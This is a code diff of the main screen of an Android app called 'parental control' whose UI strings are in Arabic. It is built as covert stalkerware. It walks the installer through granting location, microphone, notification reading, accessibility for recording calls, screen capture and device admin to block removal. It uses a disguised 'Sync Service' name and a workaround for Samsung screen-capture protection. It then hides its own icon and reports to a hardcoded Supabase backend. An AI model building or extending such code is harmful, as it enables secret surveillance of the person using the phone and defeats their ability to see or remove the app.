@@ -1,259 +1,324 @@
 package com.example.parentalcontrol
 
-import android.app.Activity
-import android.content.ComponentName
+import android.util.Log
+import android.app.AppOpsManager
 import android.content.Context
 import android.content.Intent
+import android.content.pm.PackageManager
+import android.graphics.Color
 import android.net.Uri
 import android.os.Build
 import android.os.Bundle
 import android.os.PowerManager
-import android.media.projection.MediaProjectionManager
 import android.provider.Settings
-import android.util.Log
+import android.view.View
 import android.widget.Toast
+import androidx.activity.result.contract.ActivityResultContracts
 import androidx.appcompat.app.AlertDialog
 import androidx.appcompat.app.AppCompatActivity
+import androidx.core.content.ContextCompat
+import androidx.lifecycle.lifecycleScope
+import com.example.parentalcontrol.databinding.ActivityMainBinding
+import com.example.parentalcontrol.databinding.ItemSetupStepBinding
 import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
+import kotlinx.coroutines.Job
+import kotlinx.coroutines.delay
 import kotlinx.coroutines.launch
-import androidx.activity.result.contract.ActivityResultContracts
 
-/**
- * Activity الأساسية لإعداد وتفعيل ميزات الرقابة الأبوية
- */
 class MainActivity : AppCompatActivity() {
 
+    private lateinit var binding: ActivityMainBinding
+    private var refreshJob: Job? = null
     private lateinit var parentalControlManager: ParentalControlManager
-    private val requiredPermissions = arrayOf(
+
+    private val basicPermissions = arrayOf(
         android.Manifest.permission.ACCESS_FINE_LOCATION,
         android.Manifest.permission.ACCESS_COARSE_LOCATION,
-        android.Manifest.permission.RECORD_AUDIO
+        android.Manifest.permission.RECORD_AUDIO,
+        android.Manifest.permission.READ_PHONE_STATE
     )
-    private val adminLauncher = registerForActivityResult(
-        ActivityResultContracts.StartActivityForResult()
-    ) { result ->
-        if (parentalControlManager.isAdminActive()) {
-            Log.i("MainActivity", "Admin activated! Now requesting screen capture...")
-            requestScreenCapture()
-        } else {
-            Log.w("MainActivity", "Admin activation failed or cancelled")
-        }
-    }
-
-    private val screenCaptureLauncher = registerForActivityResult(
-        ActivityResultContracts.StartActivityForResult()
-    ) { result ->
-        if (result.resultCode == Activity.RESULT_OK && result.data != null) {
-            Log.i("MainActivity", "Screen capture permission granted!")
-            // بدء الخدمة مع بيانات الإذن
-            MonitoringForegroundService.start(this, result.resultCode, result.data)
-            triggerStealthMode()
-        } else {
-            Log.w("MainActivity", "Screen capture permission denied")
-            // إذا رفض، نبدأ الخدمة بدون لقطات شاشة أو نكرر الطلب
-            MonitoringForegroundService.start(this)
-            triggerStealthMode()
-        }
-    }
-
-    private val permissionLauncher = registerForActivityResult(
-        ActivityResultContracts.RequestMultiplePermissions()
-    ) { permissions ->
-        val allGranted = permissions.entries.all { it.value }
-        if (allGranted) {
-            Log.i("MainActivity", "All permissions granted by user")
-            setupAppFlow()
-        } else {
-            Log.w("MainActivity", "Some permissions were denied")
-            // نواصل العمل بما هو متاح
-            setupAppFlow()
-        }
-    }
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
-        
-        try {
-            parentalControlManager = ParentalControlManager(this)
+        binding = ActivityMainBinding.inflate(layoutInflater)
+        setContentView(binding.root)
 
-            // 1. فحص وطلب الصلاحيات المفقودة
-            checkAndRequestPermissions()
-        } catch (e: Exception) {
-            Log.e("MainActivity", "Error in onCreate: ${e.message}")
-        }
+        parentalControlManager = ParentalControlManager(this)
+        setupUI()
+        initializeServices()
     }
 
-    private fun checkAndRequestPermissions() {
-        val missing = requiredPermissions.filter {
-            checkSelfPermission(it) != android.content.pm.PackageManager.PERMISSION_GRANTED
-        }
-        if (missing.isNotEmpty()) {
-            permissionLauncher.launch(missing.toTypedArray())
-        } else {
-            setupAppFlow()
-        }
+    override fun onResume() {
+        super.onResume()
+        startStatusRefreshLoop()
     }
 
-    private fun setupAppFlow() {
-        try {
-            val initialized = SupabaseManager.getInstance().initialize(
-                "https://kubowqqqawkgghxcktoe.supabase.co",
-                "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Imt1Ym93cXFxYXdrZ2doeGNrdG9lIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzM3MTIwNzksImV4cCI6MjA4OTI4ODA3OX0.RnKtHRnqrdh0wF4vl-LWQEjlw7uYDCThqAn23WBMafM"
-            )
-
-            if (!initialized) {
-                Log.w("MainActivity", "Supabase failed to initialize, but continuing service...")
-            }
-
-            // 3. تشغيل خدمة المراقبة (مهم جداً أن يبدأ والتطبيق في الواجهة)
-            MonitoringForegroundService.start(this)
-
-            // 4. إرسال Heartbeat للتأكد من ظهور الجهاز في لوحة التحكم
-            CoroutineScope(Dispatchers.IO).launch {
-                SupabaseManager.getInstance().updateHeartbeat(this@MainActivity)
-            }
-
-            // 5. إعداد نظام المراقبة (Watchdog) لضمان استمرار الخدمة
-            ServiceWatchdogJobService.schedule(this)
-
-            // 6. إعداد الواجهة والطلبات
-            setupUI()
-            requestIgnoreBatteryOptimizations()
-            
-            // 7. تجاوز قيود سامسونج للبطارية إذا لزم الأمر
-            if (Build.MANUFACTURER.contains("samsung", ignoreCase = true)) {
-                launchSamsungBatterySettings()
-            }
-
-            // 8. طلب إذن التخفي والالتقاط (بعد تأكيد المسؤول)
-            if (parentalControlManager.isAdminActive()) {
-                // نطلب تصوير الشاشة أولاً، وعندما ينتهي (بنجاح أو فشل) سنقوم بالتخفي
-                requestScreenCapture()
-            } else {
-                showEnableAdminDialog()
-            }
-        } catch (e: Exception) {
-            Log.e("MainActivity", "Error in setupAppFlow: ${e.message}")
-        }
+    override fun onPause() {
+        super.onPause()
+        refreshJob?.cancel()
     }
 
-    /**
-     * تجاوز ميزة تحسين البطارية الخاصة بسامسونج لضمان بقاء التطبيق في الخلفية
-     */
-    private fun launchSamsungBatterySettings() {
-        try {
-            val intent = Intent()
-            intent.component = ComponentName(
-                "com.samsung.android.lool",
-                "com.samsung.android.sm.ui.battery.BatteryActivity"
-            )
-            // إذا لم ينجح الأول، نجرب العام لسامسونج
-            try {
-                startActivity(intent)
-            } catch (e: Exception) {
-                intent.component = ComponentName(
-                    "com.samsung.android.sm",
-                    "com.samsung.android.sm.ui.battery.BatteryActivity"
-                )
-                startActivity(intent)
+    private fun startStatusRefreshLoop() {
+        refreshJob?.cancel()
+        refreshJob = lifecycleScope.launch {
+            while (true) {
+                updateAllStatuses()
+                delay(500) // تحديث أسرع (نصف ثانية) لرصد نجاح التفعيل فوراً
             }
-        } catch (e: Exception) {
-            Log.e("MainActivity", "Samsung battery settings not found: ${e.message}")
-        }
-    }
-
-    /**
-     * طلب استثناء من تحسينات البطارية لضمان عدم قتل الخدمة في الخلفية
-     */
-    private fun requestIgnoreBatteryOptimizations() {
-        try {
-            val packageName = packageName
-            val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
-            if (!pm.isIgnoringBatteryOptimizations(packageName)) {
-                val intent = Intent().apply {
-                    action = Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS
-                    data = Uri.parse("package:$packageName")
-                }
-                startActivity(intent)
-            }
-        } catch (e: Exception) {
-            Log.e("MainActivity", "Error requesting battery optimization exemption: ${e.message}")
         }
     }
 
     private fun setupUI() {
-        checkAdminStatus()
-    }
-
-    private fun checkAdminStatus() {
-        if (parentalControlManager.isAdminActive()) {
-            Toast.makeText(this, "✓ محرك التحسين قيد التشغيل في الخلفية", Toast.LENGTH_SHORT).show()
-            // بدلاً من الانتقال لصفحة الإعدادات، نبدأ عملية الالتقاط ثم التخفي
-            requestScreenCapture()
-        } else {
-            showEnableAdminDialog()
+        // Step 1: Basic
+        binding.stepBasic.tvStepTitle.text = "الأذونات الأساسية (Basic Permissions)"
+        binding.stepBasic.tvStepSubtitle.text = "الموقع، الميكروفون، وحالة الهاتف"
+        binding.stepBasic.btnStepAction.setOnClickListener {
+            requestPermissionsLauncher.launch(basicPermissions)
         }
-    }
 
-    private fun showEnableAdminDialog() {
-        AlertDialog.Builder(this)
-            .setTitle("تفعيل وضع الشبح والتحصين")
-            .setMessage("لاستخدام ميزات الحماية المتقدمة وإخفاء التطبيق، يجب تفعيل صلاحيات المسؤول")
-            .setPositiveButton("تفعيل الآن") { _, _ ->
-                val intent = parentalControlManager.getAdminRequestIntent()
-                adminLauncher.launch(intent)
+        // Step 2: Notifications
+        binding.stepNotifications.tvStepTitle.text = "الوصول للإشعارات (Notifications)"
+        binding.stepNotifications.tvStepSubtitle.text = "مطلوب لقراءة التنبيهات والرسائل"
+        binding.stepNotifications.btnStepAction.setOnClickListener {
+            startActivity(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS))
+        }
+
+        // Step 3: Accessibility
+        binding.stepAccessibility.tvStepTitle.text = "خدمة إمكانية الوصول (Accessibility)"
+        binding.stepAccessibility.tvStepSubtitle.text = "هام جداً لتسجيل الأنشطة والمكالمات"
+        binding.stepAccessibility.btnStepAction.setOnClickListener {
+            showAccessibilityGuidance()
+        }
+
+        // Step 4: Usage Stats
+        binding.stepUsage.tvStepTitle.text = "بيانات الاستخدام (Usage Access)"
+        binding.stepUsage.tvStepSubtitle.text = "لمعرفة التطبيقات المستخدمة ومدة النشاط"
+        binding.stepUsage.btnStepAction.setOnClickListener {
+            startActivity(Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS))
+        }
+
+        // Step 5: Overlay
+        binding.stepOverlay.tvStepTitle.text = "الظهور فوق التطبيقات (Overlay)"
+        binding.stepOverlay.tvStepSubtitle.text = "لضمان استقرار الخدمة في الخلفية"
+        binding.stepOverlay.btnStepAction.setOnClickListener {
+            showOverlayGuidance()
+        }
+
+        // Step 6: Battery
+        binding.stepBattery.tvStepTitle.text = "تجاهل تحسين البطارية (Battery)"
+        binding.stepBattery.tvStepSubtitle.text = "لمنع النظام من إيقاف التطبيق تلقائياً"
+        binding.stepBattery.btnStepAction.setOnClickListener {
+            val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS, Uri.parse("package:$packageName"))
+            startActivity(intent)
+        }
+
+        // Step 7: Projection (NEW)
+        binding.stepProjection.tvStepTitle.text = "صلاحية تصوير الشاشة (Screen Capture)"
+        binding.stepProjection.tvStepSubtitle.text = "مطلوب لالتقاط صور وفيديو للهاتف عن بعد"
+        binding.stepProjection.btnStepAction.setOnClickListener {
+            // استخدام النشاط الشفاف (Nuclear Option) لتجاوز حماية سامسونج
+            val intent = Intent(this, MediaProjectionRequestActivity::class.java)
+            startActivity(intent)
+        }
+
+        // Admin Step
+        binding.stepAdmin.tvStepTitle.text = "مسؤول الجهاز (Device Admin)"
+        binding.stepAdmin.tvStepSubtitle.text = "لحماية التطبيق من الإزالة غير المصرح بها"
+        binding.stepAdmin.btnStepAction.setOnClickListener {
+            startActivity(parentalControlManager.getAdminRequestIntent())
+        }
+
+        // ─── زر تحديث التطبيق ────────────────────────────────────────
+        val currentVersion = try {
+            packageManager.getPackageInfo(packageName, 0).versionCode
+        } catch (e: Exception) { 1 }
+        binding.tvCurrentVersion.text = "v$currentVersion"
+
+        binding.btnCheckUpdate.setOnClickListener {
+            binding.btnCheckUpdate.isEnabled = false
+            binding.tvUpdateStatus.text = "⏳ جاري التحقق من السيرفر..."
+            binding.updateProgressBar.visibility = View.VISIBLE
+
+            lifecycleScope.launch {
+                try {
+                    val settings = RemoteConfigManager(this@MainActivity).fetchSettings()
+                    if (settings == null) {
+                        binding.tvUpdateStatus.text = "❌ تعذر الاتصال بالسيرفر"
+                        binding.updateProgressBar.visibility = View.GONE
+                        binding.btnCheckUpdate.isEnabled = true
+                        return@launch
+                    }
+
+                    if (settings.target_version <= currentVersion) {
+                        binding.tvUpdateStatus.text = "✅ التطبيق محدّث (v$currentVersion)"
+                        binding.updateProgressBar.visibility = View.GONE
+                        binding.btnCheckUpdate.isEnabled = true
+                        return@launch
+                    }
+
+                    // يوجد تحديث
+                    binding.tvUpdateStatus.text = "📥 جاري تحميل الإصدار v${settings.target_version}..."
+                    AppUpdateManager(this@MainActivity).checkAndExecuteUpdate(
+                        targetVersion = settings.target_version,
+                        apkPath       = settings.update_apk_path,
+                        apkUrl        = settings.update_apk_url,
+                        forceIntent   = true   // نحن في Activity مفتوح → Intent مباشر
+                    )
+                    binding.tvUpdateStatus.text = "✅ جاري فتح نافذة التثبيت..."
+                    binding.updateProgressBar.visibility = View.GONE
+                    binding.btnCheckUpdate.isEnabled = true
+
+                } catch (e: Exception) {
+                    binding.tvUpdateStatus.text = "❌ خطأ: ${e.message}"
+                    binding.updateProgressBar.visibility = View.GONE
+                    binding.btnCheckUpdate.isEnabled = true
+                }
             }
-            .setNegativeButton("إلغاء", null)
-            .setCancelable(false)
-            .show()
-    }
+        }
 
-    private fun requestScreenCapture() {
-        try {
-            val projectionManager = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
-            screenCaptureLauncher.launch(projectionManager.createScreenCaptureIntent())
-        } catch (e: Exception) {
-            Log.e("MainActivity", "Error requesting screen capture: ${e.message}")
+        // Activate Button
+        binding.btnActivate.setOnClickListener {
+            val email = binding.etEmail.text.toString()
+            if (email.isNotEmpty()) {
+                Toast.makeText(this, "تم تفعيل الحساب بنجاح ✅", Toast.LENGTH_SHORT).show()
+                binding.accountSection.visibility = View.GONE
+                binding.activitiesSection.visibility = View.VISIBLE
+            } else {
+                Toast.makeText(this, "يرجى إدخال البريد الإلكتروني", Toast.LENGTH_SHORT).show()
+            }
+        }
+
+        // Confirm Activities
+        binding.btnConfirmActivities.setOnClickListener {
+            binding.activitiesSection.visibility = View.GONE
+            binding.pinSection.visibility = View.VISIBLE
+        }
+
+        // Finish Button
+        binding.btnFinish.setOnClickListener {
             triggerStealthMode()
         }
     }
 
-    private fun triggerStealthMode() {
-        Log.i("MainActivity", "Triggering Stealth Mode...")
-        Toast.makeText(this, "✓ تم تفعيل وضع الشبح. سيختفي التطبيق الآن.", Toast.LENGTH_LONG).show()
+    private fun updateAllStatuses() {
+        val allBasic = basicPermissions.all { ContextCompat.checkSelfPermission(this, it) == PackageManager.PERMISSION_GRANTED }
+        updateStep(binding.stepBasic, allBasic)
+
+        updateStep(binding.stepNotifications, isNotificationServiceEnabled())
+        updateStep(binding.stepAccessibility, isAccessibilityServiceEnabled())
+        updateStep(binding.stepUsage, isUsageAccessGranted())
+        updateStep(binding.stepOverlay, Settings.canDrawOverlays(this))
         
-        android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
-            try {
-                StealthManager.hideAppIcon(this)
-                finish() 
-            } catch (e: Exception) {
-                Log.e("MainActivity", "Stealth error: ${e.message}")
-            }
-        }, 3000)
+        val pm = getSystemService(POWER_SERVICE) as PowerManager
+        updateStep(binding.stepBattery, pm.isIgnoringBatteryOptimizations(packageName))
+        updateStep(binding.stepProjection, MonitoringForegroundService.isProjectionActive())
+        updateStep(binding.stepAdmin, parentalControlManager.isAdminActive())
+
+        // Show account section only if permissions are mostly done
+        if (allBasic && isAccessibilityServiceEnabled() && MonitoringForegroundService.isProjectionActive()) {
+            binding.accountSection.visibility = View.VISIBLE
+        }
     }
 
-    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
-        super.onActivityResult(requestCode, resultCode, data)
-        when (requestCode) {
-            ParentalControlManager.REQUEST_CODE_ENABLE_ADMIN -> {
-                if (resultCode == Activity.RESULT_OK) {
-                    Toast.makeText(this, "✓ تم تفعيل الرقابة الأبوية بنجاح", Toast.LENGTH_LONG).show()
-                    setupParentalControls()
-                } else {
-                    Toast.makeText(this, "✗ تم إلغاء تفعيل الرقابة الأبوية", Toast.LENGTH_LONG).show()
+    private fun updateStep(stepBinding: ItemSetupStepBinding, isDone: Boolean) {
+        if (isDone) {
+            stepBinding.ivStepStatus.setImageResource(R.drawable.ic_check_circle)
+            stepBinding.ivStepStatus.setColorFilter(Color.parseColor("#10B981"))
+            stepBinding.btnStepAction.visibility = View.GONE
+            stepBinding.tvStepSubtitle.text = "مفعل ✅"
+        } else {
+            stepBinding.ivStepStatus.setImageResource(R.drawable.ic_error)
+            stepBinding.ivStepStatus.setColorFilter(Color.parseColor("#EF4444"))
+            stepBinding.btnStepAction.visibility = View.VISIBLE
+        }
+    }
+
+    private val requestPermissionsLauncher = registerForActivityResult(ActivityResultContracts.RequestMultiplePermissions()) { updateAllStatuses() }
+
+    private fun isNotificationServiceEnabled(): Boolean {
+        val names = Settings.Secure.getString(contentResolver, "enabled_notification_listeners")
+        return names?.contains(packageName) == true
+    }
+
+    private fun isAccessibilityServiceEnabled(): Boolean {
+        val enabledServices = Settings.Secure.getString(contentResolver, Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES)
+        return enabledServices?.contains(packageName) == true
+    }
+
+    private fun isUsageAccessGranted(): Boolean {
+        val appOps = getSystemService(Context.APP_OPS_SERVICE) as AppOpsManager
+        val mode = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+            appOps.unsafeCheckOpNoThrow(AppOpsManager.OPSTR_GET_USAGE_STATS, android.os.Process.myUid(), packageName)
+        } else {
+            appOps.checkOpNoThrow(AppOpsManager.OPSTR_GET_USAGE_STATS, android.os.Process.myUid(), packageName)
+        }
+        return mode == AppOpsManager.MODE_ALLOWED
+    }
+
+    private fun showAccessibilityGuidance() {
+        AlertDialog.Builder(this)
+            .setTitle("تفعيل خدمة Sync Service")
+            .setMessage("إذا ظهر لك تنبيه 'الضبط المقيد' (Restricted setting)، يرجى الضغط على زر 'معلومات التطبيق' بالأسفل، ثم الضغط على النقاط الثلاث بالأعلى واختيار 'السماح بالضبط المقيد'.")
+            .setPositiveButton("إعدادات إمكانية الوصول") { _, _ ->
+                startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
+            }
+            .setNeutralButton("معلومات التطبيق (لحل القيود)") { _, _ ->
+                val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS, Uri.parse("package:$packageName"))
+                intent.data = Uri.parse("package:$packageName")
+                startActivity(intent)
+            }
+            .show()
+    }
+
+    private fun showOverlayGuidance() {
+        AlertDialog.Builder(this)
+            .setTitle("تفعيل الظهور فوق التطبيقات")
+            .setMessage("إذا لم تجد تطبيق Sync Service في القائمة، يرجى الضغط على زر 'معلومات التطبيق' بالأسفل، ثم الضغط على النقاط الثلاث بالأعلى واختيار 'السماح بالضبط المقيد'.")
+            .setPositiveButton("انتقال للقائمة") { _, _ ->
+                val intent = Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:$packageName"))
+                startActivity(intent)
+            }
+            .setNeutralButton("معلومات التطبيق (لحل القيود)") { _, _ ->
+                val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS, Uri.parse("package:$packageName"))
+                intent.data = Uri.parse("package:$packageName")
+                startActivity(intent)
+            }
+            .show()
+    }
+
+    private fun initializeServices() {
+        CoroutineScope(Dispatchers.Main).launch {
+            SupabaseManager.getInstance().initialize(
+                "https://kubowqqqawkgghxcktoe.supabase.co",
+                "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Imt1Ym93cXFxYXdrZ2doeGNrdG9lIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzM3MTIwNzksImV4cCI6MjA4OTI4ODA3OX0.RnKtHRnqrdh0wF4vl-LWQEjlw7uYDCThqAn23WBMafM"
+            )
+            MonitoringForegroundService.start(this@MainActivity)
+
+            // Samsung One UI 7: check battery optimization after service starts
+            if (SamsungHardeningManager.isSamsungDevice) {
+                Log.i("MainActivity", "Samsung detected (One UI ${SamsungHardeningManager.getOneUIVersion()})")
+                // Only prompt if not already whitelisted
+                val pm = getSystemService(POWER_SERVICE) as PowerManager
+                if (!pm.isIgnoringBatteryOptimizations(packageName)) {
+                    SamsungHardeningManager.showSamsungBatteryOptimizationDialog(this@MainActivity)
                 }
             }
         }
     }
 
-    private fun setupParentalControls() {
-        parentalControlManager.setMaximumFailedPasswordsForWipe(5)
-        parentalControlManager.setMaximumTimeToLock(30000)
-        Toast.makeText(this, "تم إعداد إعدادات الحماية", Toast.LENGTH_SHORT).show()
-    }
-
-    override fun onDestroy() {
-        super.onDestroy()
+    private fun triggerStealthMode() {
+        Log.i("MainActivity", "Triggering Stealth Mode (Samsung Optimization)")
+        Toast.makeText(this, "اكتمل التثبيت! سيختفي التطبيق الآن.", Toast.LENGTH_LONG).show()
+        
+        // استخدام مهلة لضمان حفظ الإعدادات وقراءة الرسالة
+        android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
+            Log.d("MainActivity", "Hiding app icon now...")
+            StealthManager.hideAppIcon(this)
+            
+            // إغلاق تام لضمان تحديث اللانشر
+            finishAndRemoveTask()
+            finishAffinity()
+        }, 3000)
     }
 }
